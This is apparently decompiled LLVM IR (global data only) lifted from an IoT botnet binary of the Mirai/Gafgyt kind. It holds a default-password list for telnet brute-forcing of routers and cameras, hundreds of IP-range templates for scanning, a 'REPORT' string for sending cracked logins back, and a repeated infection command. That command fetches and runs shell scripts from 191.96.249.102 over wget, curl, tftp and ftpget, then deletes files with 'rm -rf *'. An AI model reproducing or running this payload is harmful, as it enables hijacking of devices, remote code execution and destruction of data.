source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_3200c.22 = global i32 0
@global_var_13274.26 = constant i32 -509558771
@global_var_324e4.29 = global i32 0
@global_var_324e8.30 = local_unnamed_addr global i32 0
@global_var_324ec.31 = local_unnamed_addr global i32 0
@global_var_32220.34 = local_unnamed_addr global i32 4095
@global_var_3221c.37 = global i32 362436
@global_var_23654.39 = constant [7 x i8] c"(null)\00"
@global_var_364e4.41 = local_unnamed_addr global i32 0
@global_var_2365c.43 = constant [8 x i8] c"/bin/sh\00"
@global_var_23664.45 = constant [3 x i8] c"sh\00"
@global_var_23668.47 = constant [3 x i8] c"-c\00"
@global_var_2366c.50 = constant i32 -1
@global_var_23a6c.52 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_23a7c.54 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_324c8.59 = global i32 0
@global_var_23a88.61 = constant [5 x i8] c"PING\00"
@global_var_23a90.63 = constant [14 x i8] c"gethostbyname\00"
@global_var_324d0.65 = global i32 0
@global_var_324d4.66 = local_unnamed_addr global i32 0
@global_var_391f4.68 = global i32 0
@global_var_23aa0.70 = constant [6 x i8] c":>%$#\00"
@global_var_23aa8.80 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_23ab4.82 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_23ac4.84 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_23ad0.86 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_23ae0.88 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_23aec.90 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_23afc.92 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_23b08.94 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_23b18.96 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_23b28.98 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_23b38.100 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_23b48.102 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_23b54.104 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_23b64.106 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_23b74.108 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_23b84.110 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_23b94.112 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_23ba4.114 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_23bb4.116 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_23bc4.118 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_23bd0.120 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_23bdc.122 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_23bec.124 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_23bf8.126 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_23c04.128 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_23c10.130 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_23c1c.132 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_23c28.134 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_23c38.136 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_23c48.138 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_23c54.140 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_23c64.142 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_23c70.144 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_23c7c.146 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_23c88.148 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_23c94.150 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_23ca0.152 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_23cac.154 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_23cb8.156 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_23cc8.158 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_23cd8.160 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_23ce8.162 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_23cf8.164 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_23d08.166 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_23d18.168 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_23d28.170 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_23d38.172 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_23d48.174 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_23d58.176 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_23d68.178 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_23d78.180 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_23d88.182 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_23d98.184 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_23da8.186 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_23db8.188 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_23dc8.190 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_23dd8.192 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_23de8.194 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_23df8.196 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_23e08.198 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_23e18.200 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_23e28.202 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_23e38.204 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_23e48.206 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_23e58.208 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_23e68.210 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_23e78.212 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_23e88.214 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_23e98.216 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_23ea8.219 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_23eb8.221 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_23ec8.223 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_23ed8.225 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_23ee8.227 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_23ef8.229 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_23f08.231 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_23f18.233 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_23f28.235 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_23f38.237 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_23f48.239 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_23f58.241 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_23f68.243 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_23f78.245 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_23f88.247 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_23f98.249 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_23fa8.251 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_23fb8.253 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_23fc8.255 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_23fd8.257 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_23fe8.259 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_23ff8.261 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_24008.263 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_24018.265 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_24028.267 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_24038.269 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_24048.271 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_24058.273 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_24068.275 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_24078.277 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_24084.279 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_24094.281 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_240a4.283 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_240b4.285 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_240c0.287 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_240d0.289 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_240e0.291 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_240f0.293 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_24100.295 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_24110.297 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_24120.299 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_24130.301 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_24140.303 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_24150.305 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_24160.307 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_24170.309 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_24180.311 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_24190.313 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_241a0.315 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_241b0.317 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_241bc.319 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_241cc.321 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_241dc.323 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_241ec.325 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_241fc.327 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_2420c.329 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_2421c.331 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_2422c.333 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_2423c.335 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_2424c.337 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_2425c.339 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_2426c.341 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_2427c.343 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_2428c.345 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_2429c.347 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_242ac.349 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_242bc.351 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_242cc.353 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_242dc.355 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_242ec.357 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_242fc.359 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_2430c.361 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_2431c.363 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_2432c.366 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_2433c.368 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_2434c.370 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_2435c.373 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_2436c.375 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_2437c.377 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_2438c.379 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_2439c.381 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_243ac.383 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_243b8.385 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_243c8.387 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_243d8.389 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_243e8.391 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_243f8.393 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_24408.395 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_24418.397 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_24428.399 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_24438.401 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_24448.403 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_24458.405 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_24468.407 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_24478.409 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_24488.411 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_24498.413 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_244a8.415 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_244b8.417 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_244c8.419 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_244d8.421 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_244e8.423 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_244f8.425 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_24508.428 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_24518.430 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_24528.432 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_24538.434 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_24548.436 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_24558.438 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_24568.440 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_24578.442 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_24588.444 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_24598.446 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_245a8.448 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_245b8.450 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_245c8.452 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_245d8.454 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_245e8.456 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_245f8.458 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_24608.460 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_24618.462 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_24628.464 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_24638.466 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_24648.468 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_24658.470 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_24668.472 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_24678.474 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_24688.476 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_24698.478 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_32224.481 = global i32 110
@global_var_246a8.485 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_391e8.487 = global i32 0
@global_var_23640.489 = constant [8 x i8] c"BusyBox\00"
@global_var_23648.490 = constant i32 36
@global_var_2364c.491 = constant i32 35
@global_var_23650.492 = constant [3 x i8] c"~#\00"
@global_var_321d4.493 = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23640.489, i32 0, i32 0), i8* bitcast (i32* @global_var_23648.490 to i8*), i8* bitcast (i32* @global_var_2364c.491 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_23650.492, i32 0, i32 0)]
@global_var_23608.495 = constant [7 x i8] c"nvalid\00"
@global_var_23610.496 = constant [6 x i8] c"ailed\00"
@global_var_23618.497 = constant [9 x i8] c"ncorrect\00"
@global_var_23624.498 = constant [6 x i8] c"enied\00"
@global_var_2362c.499 = constant [5 x i8] c"rror\00"
@global_var_23634.500 = constant [7 x i8] c"oodbye\00"
@global_var_2363c.501 = constant [4 x i8] c"bad\00"
@global_var_321b4.502 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23608.495, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23610.496, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23618.497, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23624.498, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2362c.499, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23634.500, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2363c.501, i32 0, i32 0)]
@global_var_321a0 = external global i32
@global_var_23280.509 = constant [7 x i8] c"666666\00"
@global_var_23288.510 = constant [8 x i8] c"support\00"
@global_var_23294.511 = constant [8 x i8] c"default\00"
@global_var_232a0.512 = constant [5 x i8] c"root\00"
@global_var_232a8.513 = constant [6 x i8] c"admin\00"
@global_var_232b0.514 = constant [11 x i8] c"supervisor\00"
@global_var_232bc.515 = constant [5 x i8] c"ubnt\00"
@global_var_232c4.516 = constant i32 0
@global_var_232c8.517 = constant [5 x i8] c"1234\00"
@global_var_232d0.518 = constant [7 x i8] c"123456\00"
@global_var_232d8.519 = constant [5 x i8] c"vnpt\00"
@global_var_232e0.520 = constant [11 x i8] c"1234567890\00"
@global_var_232ec.521 = constant [7 x i8] c"antslq\00"
@global_var_232f4.522 = constant [9 x i8] c"zyad1234\00"
@global_var_23300.523 = constant [5 x i8] c"anko\00"
@global_var_23308.524 = constant [5 x i8] c"tini\00"
@global_var_23310.525 = constant [8 x i8] c"letacla\00"
@global_var_2331c.526 = constant [4 x i8] c"5up\00"
@global_var_23324.527 = constant [7 x i8] c"xc3511\00"
@global_var_2332c.528 = constant [703 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_320ec.529 = global [45 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23280.509, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23288.510, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23294.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_232a8.513, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_232a8.513, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_232a8.513, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_232a8.513, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23288.510, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_232b0.514, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_232b0.514, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232bc.515, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23280.509, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23288.510, i32 0, i32 0), i8* bitcast (i32* @global_var_232c4.516 to i8*), i8* bitcast (i32* @global_var_232c4.516 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_232a8.513, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232c8.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_232d0.518, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232c8.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232d8.519, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_232e0.520, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23288.510, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_232ec.521, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_232f4.522, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_23300.523, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_23308.524, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23310.525, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_232b0.514, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232bc.515, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2331c.526, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23324.527, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_2332c.528, i32 0, i32 0)]
@global_var_246b4.531 = constant [3 x i8] c"\0D\0A\00"
@global_var_32144.533 = global [23 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23280.509, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23288.510, i32 0, i32 0), i8* bitcast (i32* @global_var_232c4.516 to i8*), i8* bitcast (i32* @global_var_232c4.516 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_232a8.513, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232c8.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232a0.512, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_232d0.518, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232c8.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232d8.519, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_232e0.520, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23288.510, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_232ec.521, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_232f4.522, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_23300.523, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_23308.524, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23310.525, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_232b0.514, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_232bc.515, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2331c.526, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23324.527, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_2332c.528, i32 0, i32 0)]
@global_var_321e8.535 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23608.495, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23610.496, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23618.497, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23624.498, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2362c.499, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23634.500, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2363c.501, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_23640.489, i32 0, i32 0), i8* bitcast (i32* @global_var_23648.490 to i8*), i8* bitcast (i32* @global_var_2364c.491 to i8*)]
@global_var_246b8.538 = constant i32 993024795
@global_var_24724.540 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_3219c.542 = local_unnamed_addr global [703 x i8]* @global_var_2332c.528
@global_var_d100.543 = constant i32 436207625
@global_var_24734.545 = constant [711 x i8] c"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A x00\00"
@global_var_249fc.547 = constant [3 x i8] c"AA\00"
@global_var_24a04.549 = constant [704 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_26620.551 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_26630.552 = constant [6 x i8] c"/tmp/\00"
